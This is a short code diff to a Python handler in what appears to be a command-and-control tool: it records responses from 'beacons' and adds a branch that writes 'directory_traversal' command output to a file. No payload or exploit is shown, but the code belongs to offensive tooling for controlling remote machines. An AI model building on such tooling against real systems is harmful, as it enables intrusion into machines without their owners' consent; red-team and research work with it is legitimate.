@@ -131,11 +131,17 @@ def response(path1, version):
             found = True
             if i < len(beacon_commands["command_output"]):
                 beacon_commands["command_output"][i] = output
-                print(
-                    f"Command {beacon_commands['beacon_uuid'][i]} ",
-                    "responded with:"
-                )
-                print(output)
+                if beacon_commands["command"][i] == "directory_traversal":
+                    # need to handle this properly
+                    print("Directory Traversal Responded, saved to file")
+                    with open("directory_traversal.txt", "w") as f:
+                        f.write(output)
+                else:
+                    print(
+                        f"Command {beacon_commands['beacon_uuid'][i]} ",
+                        "responded with:"
+                    )
+                    print(output)
             else:
                 print(
                     f"Index {i} out of range for ",
